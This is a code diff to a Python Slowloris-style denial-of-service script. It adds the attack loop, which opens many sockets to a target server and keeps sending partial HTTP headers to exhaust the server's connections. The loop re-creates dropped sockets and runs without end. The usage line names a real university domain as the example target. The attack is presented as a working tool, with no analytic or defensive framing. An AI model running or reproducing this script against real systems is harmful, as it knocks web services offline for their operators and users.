@@ -3,6 +3,7 @@
 import socket
 import random
 import sys
+import time
 
 headers = [
     "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0",
@@ -33,7 +34,7 @@ def gen_socket(ip, https=True) -> socket:
     s.settimeout(4)
     s.connect((ip, port))
 
-    int: rand_int = random.randint(0, 2000)
+    rand_int = random.randint(0, 2000)
     request = BASE_REQUEST.format(rand_int).encode('UTF-8')
     s.send(request)
 
@@ -44,7 +45,7 @@ def gen_socket(ip, https=True) -> socket:
     return s
 
 
-def check_and_assign_args(arg_ip, arg_port_type, arg_num_sockets, arg_time):
+def check_and_assign_args(arg_ip, arg_port_type, arg_num_sockets, arg_time) -> (str, bool, int, int):
 
     # TODO: Work on assertions
 
@@ -56,7 +57,7 @@ def check_and_assign_args(arg_ip, arg_port_type, arg_num_sockets, arg_time):
     #     print("Time:", arg_time, "is not an int")
     #     exit(FAILURE)
 
-    ip = arg_ip
+    ip = str(arg_ip)
     is_https = False
 
     if (str(arg_port_type) == "https"):
@@ -79,13 +80,43 @@ if __name__ == "__main__":
         print("\t| python {} floridapoly.edu https 150 5".format(sys.argv[0]))
         exit(FAILURE)
 
-    ip, is_https, num_sockets, time = check_and_assign_args(
+    ip, is_https, num_sockets, timer = check_and_assign_args(
         sys.argv[1],
         sys.argv[2],
         sys.argv[3],
         sys.argv[4],
     )
 
-    print(ip, is_https, num_sockets, time)
+    sockets = []
+
+    for _ in range(num_sockets):
+        try:
+            s = gen_socket(ip, is_https)
+
+        except socket.error:
+            break
+
+        sockets.append(s)
+
+    while True:
+        print(
+            "\033[1;34;40m Sending Keep-Alive Headers with {} sockets".format(len(sockets)))
+
+        for s in sockets:
+            try:
+                s.send("X-a {}\r\n".format(random.randint(1, 5000)).encode('UTF-8'))
+            except socket.error:
+                sockets.remove(s)
+
+        for _ in range(num_sockets - len(sockets)):
+            print("\033[1;34;40m {}Re-creating Socket...".format("\n"))
+            try:
+                s = gen_socket(ip, is_https)
+                if s:
+                    sockets.append(s)
+            except socket.error:
+                break
+
+        time.sleep(timer)
 
     exit(SUCCESS)
